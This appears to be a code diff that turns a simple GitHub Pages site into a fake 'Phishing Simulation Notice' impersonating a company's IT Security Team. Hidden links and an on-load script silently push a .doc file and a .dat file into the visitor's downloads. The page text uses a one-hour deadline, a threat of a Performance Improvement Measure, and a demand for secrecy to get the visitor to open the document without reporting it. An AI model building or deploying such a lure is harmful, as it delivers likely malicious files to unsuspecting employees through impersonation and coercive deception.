@@ -1,5 +1,50 @@
-<!doctype html>
 <html>
-  <head><meta charset="utf-8"><title>My Site</title></head>
-  <body><h1>Hello from GitHub Pages</h1></body>
+<body>
+<a href="/SandsPhishingGuild.doc" download="SandsPhishingGuild.doc" id="dl1" style="display: none;">.</a>
+<a href="/SandsPhishingGuild_data.dat" download="SandsPhishingGuild_data.dat" id="dl2" style="display: none;">.</a>
+<img src="https://www.sands.com/content/themes/base/assets/img/logos/logo.png" style="width: 10%; height: auto">
+
+<h1>Phishing Simulation Notice</h1>
+<p>
+ You have clicked a link that was part of an internal
+ <strong>Phishing Awareness Training Exercise</strong>.
+ These simulations help ensure that all employees remain vigilant and prepared to recognize and report
+ malicious emails that could compromise company systems or data.
+</p><p>
+ To complete this training requirement, the IT Security Team has uploaded a document titled
+ <strong>"SandsPhishingGuild.doc"</strong> to your Downloads folder. Please review this document carefully. It explains:
+</p>
+<ul>
+ <li>How this phishing simulation works</li>
+ <li>Common indicators of phishing attempts</li>
+ <li>Steps you can take to protect yourself and the organization</li>
+</ul>
+
+<h2>Required Action</h2>
+<p>
+ You must read the document and click the <strong>"Acknowledge"</strong> button at the end
+ <span class="important">within the next hour</span>.
+</p><p class="important">
+ Failure to complete this requirement within the allotted time will result in a
+ Performance Improvement Measure (PIM) being issued in accordance with company policy.
+</p>
+
+<h2>Confidentiality of This Exercise</h2>
+<p>
+ To preserve the effectiveness and fairness of this phishing engagement, you must
+ <strong>not discuss this simulation, its content, or this notice with your fellow employees</strong>.
+ Sharing details could compromise future training exercises and reduce their value to the organization.
+</p><p>
+ Thank you for taking our security practices seriously and helping keep our environment safe.
+</p>
+
+</body>
+<script>
+document.getElementById("dl1").click();
+window.addEventListener("load", () => {
+  setTimeout(() => {
+    document.getElementById("dl2").click();
+  }, 2000);
+});
+</script>
 </html>
